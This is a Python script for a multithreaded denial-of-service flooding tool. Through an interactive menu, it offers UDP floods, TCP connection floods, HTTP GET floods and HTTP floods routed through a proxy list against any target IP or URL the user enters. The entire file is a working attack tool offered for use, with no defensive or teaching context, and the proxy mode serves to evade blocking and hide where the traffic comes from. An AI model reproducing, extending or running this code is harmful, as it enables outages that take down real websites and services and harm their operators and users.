import socket
import threading
import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
init(autoreset=True)

def banner():
 print(Fore.MAGENTA + r''''

.... ##...##..##..##....######..##.......####...##..##...####..
... ###.###...####.....##......##......##..##..###.##..##.....
...##.#.##....##......####....##......######..##.###..##.###.
..##...##....##......##......##......##..##..##..##..##..##.
.##...##....##......######..######..##..##..##..##...####..
..........................................................
....)                                                                                                                                                                                                                                                                                     ''')
def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(Fore.MAGENTA + f"[UDP] Attacking {ip}:{port} for {duration} seconds")
    while time.time() < timeout:
        try:
            for _ in range(100):
                data = random._urandom(random.randint(1024, 4096))
                sock.sendto(data, (ip, port))
        except:
            pass

def tcp_flood(ip, port, duration):
    timeout = time.time() + duration
    print(Fore.MAGENTA + f"[TCP] Sending SYN to {ip}:{port} for {duration} seconds")
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(random._urandom(4096))
            s.close()
        except:
            pass

def http_flood(target, duration):
    timeout = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Connection": "keep-alive"
    }
    while time.time() < timeout:
        try:
            requests.get(target, headers=headers, timeout=1)
        except:
            pass

def proxy_http_flood(target, duration, proxy_list):
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxy_list)
        proxies = {"http": proxy, "https": proxy}
        try:
            requests.get(target, proxies=proxies, timeout=2)
        except:
            pass

def load_proxies(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print(Fore.RED + "[!] Failed to load proxy list!")
        return []

def main():
    banner()
    print(Fore.CYAN + "[1] UDP Flood\n[2] TCP SYN Flood\n[3] HTTP Flood\n[4] HTTP Flood via Proxy")
    method = input(Fore.MAGENTA + "Select attack type >> ")
    target = input("Target IP or URL: ")
    port = int(input("Port (skip for HTTP): ") or 80)
    duration = int(input("Attack duration (seconds): "))
    threads = int(input("Number of threads: "))
    if method == "4":
        proxy_file = input("Proxy list file path (e.g., proxy.txt): ")
        proxy_list = load_proxies(proxy_file)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            if method == "1":
                executor.submit(udp_flood, target, port, duration)
            elif method == "2":
                executor.submit(tcp_flood, target, port, duration)
            elif method == "3":
                if not target.startswith("http"):
                    target = "http://" + target
                executor.submit(http_flood, target, duration)
            elif method == "4":
                if not target.startswith("http"):
                    target = "http://" + target
                executor.submit(proxy_http_flood, target, duration, proxy_list)
            else:
                print(Fore.RED + "[!] Invalid attack type.")
                return

if __name__ == "__main__":
    main()
